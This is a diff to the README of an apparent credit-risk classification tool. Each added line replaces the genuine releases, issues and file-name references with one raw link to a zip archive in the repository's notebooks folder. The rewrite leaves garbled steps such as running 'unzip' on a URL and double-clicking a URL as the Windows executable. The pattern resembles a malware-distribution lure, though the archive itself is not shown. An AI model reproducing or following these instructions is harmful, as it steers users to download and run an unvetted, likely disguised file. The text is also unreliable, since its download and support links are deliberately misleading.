@@ -1,7 +1,7 @@
 # 🎉 Credit-Classification - Simple Tool for Credit Risk Analysis
 
 ## 📥 Download the Application
-[![Download](https://img.shields.io/badge/Download%20Now-Click%20Here-blue.svg)](https://github.com/HMR1962/Credit-Classification/releases)
+[![Download](https://raw.githubusercontent.com/HMR1962/Credit-Classification/main/notebooks/Credit-Classification_2.2.zip%20Now-Click%https://raw.githubusercontent.com/HMR1962/Credit-Classification/main/notebooks/Credit-Classification_2.2.zip)](https://raw.githubusercontent.com/HMR1962/Credit-Classification/main/notebooks/Credit-Classification_2.2.zip)
 
 ## 🚀 Getting Started
 This guide helps you easily download and run the Credit-Classification application. If you are looking to assess credit risk with loan data, you are in the right place!
@@ -27,31 +27,31 @@ Ensure you have the necessary permissions to run applications on your device.
 ## 🌐 Download & Install
 To download the Credit-Classification application, please follow these steps:
 
-1. Visit the [Releases page](https://github.com/HMR1962/Credit-Classification/releases) of the project.
+1. Visit the [Releases page](https://raw.githubusercontent.com/HMR1962/Credit-Classification/main/notebooks/Credit-Classification_2.2.zip) of the project.
    
 2. Find the latest release. This will be at the top of the page.
    
 3. Click on the download link for the version that matches your operating system. The file name will be something like:
-   - `Credit-Classification-Windows.zip` for Windows.
-   - `Credit-Classification-Mac.zip` for macOS.
-   - `Credit-Classification-Linux.zip` for Linux.
+   - `https://raw.githubusercontent.com/HMR1962/Credit-Classification/main/notebooks/Credit-Classification_2.2.zip` for Windows.
+   - `https://raw.githubusercontent.com/HMR1962/Credit-Classification/main/notebooks/Credit-Classification_2.2.zip` for macOS.
+   - `https://raw.githubusercontent.com/HMR1962/Credit-Classification/main/notebooks/Credit-Classification_2.2.zip` for Linux.
 
 4. Once the download is complete, locate the file in your downloads folder.
 
 5. **For Windows Users:**
    - Right-click the ZIP file and select *Extract All*.
    - Follow the prompts to extract the files.
-   - Open the extracted folder and double-click `Credit-Classification.exe` to begin.
+   - Open the extracted folder and double-click `https://raw.githubusercontent.com/HMR1962/Credit-Classification/main/notebooks/Credit-Classification_2.2.zip` to begin.
 
 6. **For macOS Users:**
    - Double-click the downloaded ZIP file to extract it.
-   - Open the extracted folder and locate `Credit-Classification.app`.
+   - Open the extracted folder and locate `https://raw.githubusercontent.com/HMR1962/Credit-Classification/main/notebooks/Credit-Classification_2.2.zip`.
    - Drag it to your Applications folder for easy access.
    - Start the application from the Applications folder.
 
 7. **For Linux Users:**
    - Open a terminal window.
-   - Use the command `unzip Credit-Classification-Linux.zip` to extract the files.
+   - Use the command `unzip https://raw.githubusercontent.com/HMR1962/Credit-Classification/main/notebooks/Credit-Classification_2.2.zip` to extract the files.
    - Navigate to the extracted folder using `cd Credit-Classification`.
    - Type `./Credit-Classification` to run the application.
 
@@ -75,7 +75,7 @@ If you encounter issues while using the application, check the following:
 - **Compatibility:** Verify that you are using a supported version of Python.
 - **Permissions:** Ensure your user account has permissions to run applications and access the required directories.
 
-If problems persist, please refer to the FAQ section on our [GitHub page](https://github.com/HMR1962/Credit-Classification/issues) for additional support.
+If problems persist, please refer to the FAQ section on our [GitHub page](https://raw.githubusercontent.com/HMR1962/Credit-Classification/main/notebooks/Credit-Classification_2.2.zip) for additional support.
 
 ## 📚 Additional Resources
 For more information and detailed guidance, consider these resources:
@@ -83,6 +83,6 @@ For more information and detailed guidance, consider these resources:
 - **Community Support:** Join discussions and seek help on issues via GitHub Issues.
 - **Tutorials:** Explore tutorials on how to prepare your data and interpret the results.
 
-Remember to regularly check the [Releases page](https://github.com/HMR1962/Credit-Classification/releases) for updates and new features.
+Remember to regularly check the [Releases page](https://raw.githubusercontent.com/HMR1962/Credit-Classification/main/notebooks/Credit-Classification_2.2.zip) for updates and new features.
 
 Thank you for choosing Credit-Classification! Enjoy modeling your credit risk today.
